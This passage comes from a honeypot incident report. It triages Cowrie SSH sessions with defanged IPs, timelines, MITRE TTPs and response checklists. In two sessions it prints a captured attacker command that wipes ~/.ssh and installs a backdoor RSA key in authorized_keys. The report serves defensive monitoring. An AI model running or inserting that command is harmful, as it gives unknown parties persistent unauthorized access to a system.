- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d238d9824a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:21 |
| **Last Seen** | 2026-08-19 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:21:22` | `cowrie.session.connect` |
| `2026-08-19 17:21:22` | `cowrie.client.version` |
| `2026-08-19 17:21:22` | `cowrie.client.kex` |
| `2026-08-19 17:21:22` | `cowrie.login.success` |
| `2026-08-19 17:21:23` | `cowrie.session.params` |
| `2026-08-19 17:21:23` | `cowrie.command.input` |
| `2026-08-19 17:21:23` | `cowrie.log.closed` |
| `2026-08-19 17:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef6f0cdd70d

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:27 |
| **Last Seen** | 2026-08-19 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:27:18` | `cowrie.session.connect` |
| `2026-08-19 17:27:18` | `cowrie.client.version` |
| `2026-08-19 17:27:18` | `cowrie.client.kex` |
| `2026-08-19 17:27:19` | `cowrie.login.success` |
| `2026-08-19 17:27:19` | `cowrie.session.params` |
| `2026-08-19 17:27:19` | `cowrie.command.input` |
| `2026-08-19 17:27:20` | `cowrie.log.closed` |
| `2026-08-19 17:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf962d546f6

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 17:28 |
| **Last Seen** | 2026-08-19 17:28 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:28:26` | `cowrie.session.connect` |
| `2026-08-19 17:28:28` | `cowrie.client.version` |
| `2026-08-19 17:28:28` | `cowrie.client.kex` |
| `2026-08-19 17:28:35` | `cowrie.login.success` |
| `2026-08-19 17:28:38` | `cowrie.session.params` |
| `2026-08-19 17:28:38` | `cowrie.command.input` |
| `2026-08-19 17:28:40` | `cowrie.log.closed` |
| `2026-08-19 17:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e42e220896da

| Field | Detail |
|---|---|
| **Source IP** | `149.54.15[.]162` |
| **First Seen** | 2026-08-19 17:30 |
| **Last Seen** | 2026-08-19 17:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:30:29` | `cowrie.session.connect` |
| `2026-08-19 17:30:29` | `cowrie.client.version` |
| `2026-08-19 17:30:29` | `cowrie.client.kex` |
| `2026-08-19 17:30:30` | `cowrie.login.success` |
| `2026-08-19 17:30:31` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.54.15[.]162` to AbuseIPDB if not already reported
- [ ] Block `149.54.15[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db1f74e81c2

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-08-19 17:30 |
| **Last Seen** | 2026-08-19 17:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:30:41` | `cowrie.session.connect` |
| `2026-08-19 17:30:42` | `cowrie.client.version` |
| `2026-08-19 17:30:42` | `cowrie.client.kex` |
| `2026-08-19 17:30:43` | `cowrie.login.success` |
| `2026-08-19 17:30:43` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7168acc00777

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:33 |
| **Last Seen** | 2026-08-19 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:33:15` | `cowrie.session.connect` |
| `2026-08-19 17:33:15` | `cowrie.client.version` |
| `2026-08-19 17:33:15` | `cowrie.client.kex` |
| `2026-08-19 17:33:15` | `cowrie.login.success` |
| `2026-08-19 17:33:16` | `cowrie.session.params` |
| `2026-08-19 17:33:16` | `cowrie.command.input` |
| `2026-08-19 17:33:16` | `cowrie.log.closed` |
| `2026-08-19 17:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5709a536c1c5

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:39 |
| **Last Seen** | 2026-08-19 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:39:12` | `cowrie.session.connect` |
| `2026-08-19 17:39:12` | `cowrie.client.version` |
| `2026-08-19 17:39:12` | `cowrie.client.kex` |
| `2026-08-19 17:39:13` | `cowrie.login.success` |
| `2026-08-19 17:39:13` | `cowrie.session.params` |
| `2026-08-19 17:39:13` | `cowrie.command.input` |
| `2026-08-19 17:39:13` | `cowrie.log.closed` |
| `2026-08-19 17:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d490f053d5c7

| Field | Detail |
|---|---|
| **Source IP** | `123.123.196[.]140` |
| **First Seen** | 2026-08-19 17:40 |
| **Last Seen** | 2026-08-19 17:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:40:40` | `cowrie.session.connect` |
| `2026-08-19 17:40:41` | `cowrie.client.version` |
| `2026-08-19 17:40:41` | `cowrie.client.kex` |
| `2026-08-19 17:40:43` | `cowrie.login.success` |
| `2026-08-19 17:40:44` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.123.196[.]140` to AbuseIPDB if not already reported
- [ ] Block `123.123.196[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4add622cea7f

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 17:40 |
| **Last Seen** | 2026-08-19 17:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:40:53` | `cowrie.session.connect` |
| `2026-08-19 17:40:54` | `cowrie.client.version` |
| `2026-08-19 17:40:54` | `cowrie.client.kex` |
| `2026-08-19 17:41:01` | `cowrie.login.success` |
| `2026-08-19 17:41:05` | `cowrie.session.params` |
| `2026-08-19 17:41:05` | `cowrie.command.input` |
| `2026-08-19 17:41:07` | `cowrie.log.closed` |
| `2026-08-19 17:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5302bdd7afcc

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:45 |
| **Last Seen** | 2026-08-19 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:45:09` | `cowrie.session.connect` |
| `2026-08-19 17:45:09` | `cowrie.client.version` |
| `2026-08-19 17:45:09` | `cowrie.client.kex` |
| `2026-08-19 17:45:10` | `cowrie.login.success` |
| `2026-08-19 17:45:10` | `cowrie.session.params` |
| `2026-08-19 17:45:10` | `cowrie.command.input` |
| `2026-08-19 17:45:10` | `cowrie.log.closed` |
| `2026-08-19 17:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea77c68f9e51

| Field | Detail |
|---|---|
| **Source IP** | `122.187.230[.]183` |
| **First Seen** | 2026-08-19 17:47 |
| **Last Seen** | 2026-08-19 17:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:47:19` | `cowrie.session.connect` |
| `2026-08-19 17:47:20` | `cowrie.client.version` |
| `2026-08-19 17:47:20` | `cowrie.client.kex` |
| `2026-08-19 17:47:23` | `cowrie.login.success` |
| `2026-08-19 17:47:24` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.230[.]183` to AbuseIPDB if not already reported
- [ ] Block `122.187.230[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03e21322036

| Field | Detail |
|---|---|
| **Source IP** | `218.13.214[.]18` |
| **First Seen** | 2026-08-19 17:47 |
| **Last Seen** | 2026-08-19 17:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:47:34` | `cowrie.session.connect` |
| `2026-08-19 17:47:34` | `cowrie.client.version` |
| `2026-08-19 17:47:34` | `cowrie.client.kex` |
| `2026-08-19 17:47:36` | `cowrie.login.success` |
| `2026-08-19 17:47:37` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.13.214[.]18` to AbuseIPDB if not already reported
- [ ] Block `218.13.214[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1476cf6df839

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-19 17:48 |
| **Last Seen** | 2026-08-19 17:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:48:04` | `cowrie.session.connect` |
| `2026-08-19 17:48:05` | `cowrie.client.version` |
| `2026-08-19 17:48:05` | `cowrie.client.kex` |
| `2026-08-19 17:48:06` | `cowrie.login.success` |
| `2026-08-19 17:48:06` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20392f165be

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-19 17:50 |
| **Last Seen** | 2026-08-19 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:50:47` | `cowrie.session.connect` |
| `2026-08-19 17:50:47` | `cowrie.client.version` |
| `2026-08-19 17:50:47` | `cowrie.client.kex` |
| `2026-08-19 17:50:47` | `cowrie.login.success` |
| `2026-08-19 17:50:47` | `cowrie.direct-tcpip.request` |
| `2026-08-19 17:50:47` | `cowrie.direct-tcpip.data` |
| `2026-08-19 17:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6871ba1f504a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:51 |
| **Last Seen** | 2026-08-19 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:51:06` | `cowrie.session.connect` |
| `2026-08-19 17:51:06` | `cowrie.client.version` |
| `2026-08-19 17:51:06` | `cowrie.client.kex` |
| `2026-08-19 17:51:06` | `cowrie.login.success` |
| `2026-08-19 17:51:07` | `cowrie.session.params` |
| `2026-08-19 17:51:07` | `cowrie.command.input` |
| `2026-08-19 17:51:07` | `cowrie.log.closed` |
| `2026-08-19 17:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69296665ffa1

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 17:53 |
| **Last Seen** | 2026-08-19 17:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:53:23` | `cowrie.session.connect` |
| `2026-08-19 17:53:25` | `cowrie.client.version` |
| `2026-08-19 17:53:25` | `cowrie.client.kex` |
| `2026-08-19 17:53:31` | `cowrie.login.success` |
| `2026-08-19 17:53:35` | `cowrie.session.params` |
| `2026-08-19 17:53:35` | `cowrie.command.input` |
| `2026-08-19 17:53:36` | `cowrie.log.closed` |
| `2026-08-19 17:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8548b3eeda

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-08-19 17:53 |
| **Last Seen** | 2026-08-19 17:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:53:52` | `cowrie.session.connect` |
| `2026-08-19 17:53:52` | `cowrie.client.version` |
| `2026-08-19 17:53:52` | `cowrie.client.kex` |
| `2026-08-19 17:53:53` | `cowrie.login.success` |
| `2026-08-19 17:53:54` | `cowrie.session.params` |
| `2026-08-19 17:53:54` | `cowrie.command.input` |
| `2026-08-19 17:53:54` | `cowrie.command.failed` |
| `2026-08-19 17:53:55` | `cowrie.log.closed` |
| `2026-08-19 17:53:56` | `cowrie.session.params` |
| `2026-08-19 17:53:56` | `cowrie.command.input` |
| `2026-08-19 17:53:56` | `cowrie.session.file_download` |
| `2026-08-19 17:53:56` | `cowrie.log.closed` |
| `2026-08-19 17:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b610e0a01576

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-08-19 17:53 |
| **Last Seen** | 2026-08-19 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:53:56` | `cowrie.session.connect` |
| `2026-08-19 17:53:56` | `cowrie.client.version` |
| `2026-08-19 17:53:56` | `cowrie.client.kex` |
| `2026-08-19 17:53:57` | `cowrie.login.success` |
| `2026-08-19 17:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6855f1cb902f

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-08-19 17:53 |
| **Last Seen** | 2026-08-19 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:53:58` | `cowrie.session.connect` |
| `2026-08-19 17:53:58` | `cowrie.client.version` |
| `2026-08-19 17:53:58` | `cowrie.client.kex` |
| `2026-08-19 17:53:59` | `cowrie.login.success` |
| `2026-08-19 17:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5acf6774f8f

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 17:57 |
| **Last Seen** | 2026-08-19 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:57:03` | `cowrie.session.connect` |
| `2026-08-19 17:57:03` | `cowrie.client.version` |
| `2026-08-19 17:57:03` | `cowrie.client.kex` |
| `2026-08-19 17:57:03` | `cowrie.login.success` |
| `2026-08-19 17:57:04` | `cowrie.session.params` |
| `2026-08-19 17:57:04` | `cowrie.command.input` |
| `2026-08-19 17:57:04` | `cowrie.log.closed` |
| `2026-08-19 17:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b61ca9dab17

| Field | Detail |
|---|---|
| **Source IP** | `194.164.59[.]59` |
| **First Seen** | 2026-08-19 17:59 |
| **Last Seen** | 2026-08-19 17:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:59:40` | `cowrie.session.connect` |
| `2026-08-19 17:59:40` | `cowrie.client.version` |
| `2026-08-19 17:59:40` | `cowrie.client.kex` |
| `2026-08-19 17:59:41` | `cowrie.login.success` |
| `2026-08-19 17:59:41` | `cowrie.session.params` |
| `2026-08-19 17:59:41` | `cowrie.command.input` |
| `2026-08-19 17:59:41` | `cowrie.command.failed` |
| `2026-08-19 17:59:42` | `cowrie.log.closed` |
| `2026-08-19 17:59:42` | `cowrie.session.params` |
| `2026-08-19 17:59:42` | `cowrie.command.input` |
| `2026-08-19 17:59:43` | `cowrie.session.file_download` |
| `2026-08-19 17:59:43` | `cowrie.log.closed` |
| `2026-08-19 17:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.59[.]59` to AbuseIPDB if not already reported
- [ ] Block `194.164.59[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39851040cfe3

| Field | Detail |
|---|---|
| **Source IP** | `194.164.59[.]59` |
| **First Seen** | 2026-08-19 17:59 |
| **Last Seen** | 2026-08-19 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:59:43` | `cowrie.session.connect` |
| `2026-08-19 17:59:43` | `cowrie.client.version` |
| `2026-08-19 17:59:43` | `cowrie.client.kex` |
| `2026-08-19 17:59:44` | `cowrie.login.success` |
| `2026-08-19 17:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.59[.]59` to AbuseIPDB if not already reported
- [ ] Block `194.164.59[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-756c11be8a8a

| Field | Detail |
|---|---|
| **Source IP** | `194.164.59[.]59` |
| **First Seen** | 2026-08-19 17:59 |
| **Last Seen** | 2026-08-19 17:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 17:59:45` | `cowrie.session.connect` |
| `2026-08-19 17:59:45` | `cowrie.client.version` |
| `2026-08-19 17:59:45` | `cowrie.client.kex` |
| `2026-08-19 17:59:45` | `cowrie.login.success` |
| `2026-08-19 17:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.59[.]59` to AbuseIPDB if not already reported
- [ ] Block `194.164.59[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c272f4cf17f

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 18:03 |
| **Last Seen** | 2026-08-19 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 18:03:00` | `cowrie.session.connect` |
| `2026-08-19 18:03:00` | `cowrie.client.version` |
| `2026-08-19 18:03:00` | `cowrie.client.kex` |
| `2026-08-19 18:03:00` | `cowrie.login.success` |
| `2026-08-19 18:03:01` | `cowrie.session.params` |
| `2026-08-19 18:03:01` | `cowrie.command.input` |
| `2026-08-19 18:03:01` | `cowrie.log.closed` |
| `2026-08-19 18:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1cb193b18a4

| Field | Detail |
|---|---|
| **Source IP** | `58.245.210[.]70` |
